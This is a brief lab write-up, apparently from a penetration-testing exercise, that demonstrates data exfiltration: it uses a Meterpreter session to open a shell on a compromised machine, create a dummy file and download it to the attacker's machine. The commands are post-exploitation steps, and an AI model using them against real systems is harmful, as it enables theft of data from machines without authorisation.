# 📂 Created a dummy file on the compromised machine and downloaded it through Meterpreter to demonstrate the impact of successful exploitation.

## Actions Taken:
### Opened a command shell from Meterpreter:
- meterpreter > shell
### Created a dummy file on the target system:
- echo This is dummy data > example.txt
### Exited the shell:
### Downloaded the file to the attacker’s machine:
meterpreter > download example.txt
<img width="1151" height="486" alt="Data Exﬁltration" src="https://github.com/user-attachments/assets/9aa5d99a-3436-43be-9259-1529a175e802" />
